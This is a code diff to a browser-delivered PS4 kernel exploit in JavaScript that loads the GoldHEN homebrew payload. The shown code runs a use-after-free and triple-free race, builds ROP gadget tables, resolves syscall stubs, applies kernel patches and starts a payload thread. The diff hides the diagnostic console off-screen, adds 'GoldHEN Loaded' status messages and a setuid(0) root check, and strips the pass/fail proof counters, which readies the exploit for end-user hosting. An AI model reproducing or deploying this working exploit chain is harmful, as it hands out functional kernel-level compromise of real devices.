@@ -6,12 +6,52 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
-const outEl = document.getElementById("out");
-const stateEl = document.getElementById("state");
+function ensureHostConsole() {
+    var out = document.getElementById("out");
+    var st = document.getElementById("state");
+    if (!out) {
+        out = document.createElement("pre");
+        out.id = "out";
+        out.setAttribute(
+            "style",
+            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
+                "overflow:hidden;opacity:0;pointer-events:none;"
+        );
+        (document.body || document.documentElement).appendChild(out);
+    }
+    if (!st) {
+        st = document.createElement("div");
+        st.id = "state";
+        st.setAttribute(
+            "style",
+            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
+                "overflow:hidden;opacity:0;pointer-events:none;"
+        );
+        (document.body || document.documentElement).appendChild(st);
+    }
+    return { outEl: out, stateEl: st };
+}
+var _hostCons = ensureHostConsole();
+const outEl = _hostCons.outEl;
+const stateEl = _hostCons.stateEl;
 const lines = [];
-let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
+
+function hostOk() {
+    var m = document.getElementById("msgs");
+    if (m) {
+        m.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
+    }
+}
+
+function hostFail() {
+    var m = document.getElementById("msgs");
+    if (m) {
+        m.innerHTML = "Failed to Load! Restart Your Console ...";
+        m.style.color = "yellow";
+    }
+}
 
 function post(tag, detail) {
     try {
@@ -43,7 +83,6 @@ function terse(s) {
     return s;
 }
 function mark(tag, detail) {
-
     const raw = detail;
     detail = terse(detail);
     lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
@@ -62,8 +101,6 @@ function mark(tag, detail) {
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
 function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
 function check(name, ok, detail) {
-    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
-    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
     return ok;
 }
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
@@ -119,6 +156,7 @@ let uafFpSaved = null;
 let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;
 
 let allDone = false;
+let payloadRunning = false;
 
 (async function () {
     let p = null;
@@ -132,7 +170,15 @@ let allDone = false;
             ? parseInt(params.get("spray"), 10) : 0x100;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) { state("Tidak ada untuk firmware ini.", "bad"); return; }
+        if (!off) {
+            var m = document.getElementById("msgs");
+            if (m) {
+                m.innerHTML = 'No offsets for this firmware: <span style="color: red;">'
+                    + (key || "Unknown") + '</span>';
+            }
+            mark("NO-OFFSETS", key || "unknown");
+            return;
+        }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
@@ -141,8 +187,8 @@ let allDone = false;
         let kpatch = null, payload = null;
         // off.kpatch wins when a firmware shares another's kernel and therefore
         // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
-        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
-            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
+        const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch
+            : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
         const KPATCH_JMP_SITES = [];
         try {
             if (kpatchName) {
@@ -164,7 +210,7 @@ let allDone = false;
               + " sites=" + KPATCH_JMP_SITES.length
             : "blob=" + kpatchName + " MISSING");
         try {
-            const r = await fetch("payload.bin");
+            const r = await fetch("goldhen_2.4b18.10.bin");
             if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
         mark("PAYLOAD-BLOB", payload
@@ -172,7 +218,7 @@ let allDone = false;
               + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
             : "MISSING");
 
-        state("Menjalankan Sistem...", "warn");
+        state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
@@ -227,7 +273,7 @@ let allDone = false;
         // collection landing here instead of on the race. If every cycle sits
         // at the floor, nothing was swept and this experiment did nothing.
         if (pairStatus.promoted && SWEEP_CYCLES > 0) {
-            state("Membuat Sistem...", "warn");
+            state("sweeping...", "warn");
             const t0 = Date.now();
             let worst = 0;
             for (let i = 0; i < SWEEP_CYCLES; ++i) {
@@ -258,7 +304,9 @@ let allDone = false;
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
         if (!check("module-bases-0x4000-aligned",
-            aligned(webkitBase) && aligned(libkernelBase), "")) return;
+            aligned(webkitBase) && aligned(libkernelBase), "")) {
+            throw new Error("module bases not aligned");
+        }
 
         const G = {};
         const GAD = [
@@ -289,7 +337,9 @@ let allDone = false;
             if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
         }
         if (!check("gadget-table-fits-module", gated === GAD.length,
-            gated + "/" + GAD.length)) return;
+            gated + "/" + GAD.length)) {
+            throw new Error("gadget table incomplete");
+        }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
 
@@ -317,7 +367,9 @@ let allDone = false;
         mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
         const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
         if (!check("syscall-page-needs-stub", miss.length === 0,
-            miss.join(","))) return;
+            miss.join(","))) {
+            throw new Error("missing syscall stubs");
+        }
 
         function bufAddr(ab) {
             const c = p.leakval(ab);
@@ -395,6 +447,19 @@ let allDone = false;
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0,
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
+			
+        try {
+            var uid0 = sc(SYS.getuid).i32;
+            var su0 = sc(SYS.setuid, 0).i32;
+            if (uid0 === 0 || su0 === 0) {
+                mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
+                var m = document.getElementById("msgs");
+                if (m) {
+                    m.innerHTML = "GoldHEN is Already Loaded ...";
+                }
+                return;
+            }
+        } catch (e) {}
 
         const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
         const scratch = bufAddr(scratchAb);
@@ -485,7 +550,7 @@ let allDone = false;
         put(msgDv, 0x10, iovAddr);
         msgDv.setInt32(0x18, NUM_MSG_IOV, true);
 
-        state("Mengatur Sistem...", "warn");
+        state("setting up...", "warn");
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
             throw new Error("socketpair failed");
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -553,13 +618,13 @@ let allDone = false;
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
-        state("Mengaktifkan " + TOTAL_WORKERS + " pekerja...", "warn");
+        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
             const w = { name: name, armed: false, wired: false };
             workers.push(w);
-            w.worker = new Worker("rpc_worker.js");
+            w.worker = new Worker("slopkit/rpc_worker.js");
             w.rpc = makeRpc(w.worker, name);
             if ((await w.rpc("ping", 15000)) !== "pong")
                 throw new Error(name + " did not answer ping");
@@ -802,7 +867,7 @@ let allDone = false;
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
             state("REBOOT FIRST -- this kernel is still poisoned", "bad");
-            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
+            hostFail();
             return;
         }
         check("console-rebooted-since-last-committed", true,
@@ -2257,7 +2322,6 @@ let allDone = false;
                             + " sites=" + KPATCH_JMP_SITES.length);
                     }
 
-                    let payloadRunning = false;
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
                         state("payload...", "warn");
@@ -2296,8 +2360,11 @@ let allDone = false;
                                         + " handle=" + handle);
                                     check("payload-thread-created",
                                         payloadRunning, "");
-                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
-                                        "bytes=" + payload.length + " entry=" + entry);
+                                    if (payloadRunning) {
+                                        mark("PAYLOAD-RUNNING",
+                                            "bytes=" + payload.length + " entry=" + entry);
+                                        hostOk();
+                                    }
                                 }
                             }
                         }
@@ -2449,9 +2516,14 @@ let allDone = false;
               : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
               : committed ? "FAILED IN triple free -- REBOOT"
               : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
+			  
+		if (!payloadRunning) {
+            hostFail();
+        }
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
         state("FAILED -- see log", "bad");
+        hostFail();
     } finally {
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
@@ -2482,6 +2554,5 @@ let allDone = false;
 
         if (rebootRequired)
             mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
-        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
     }
 })();
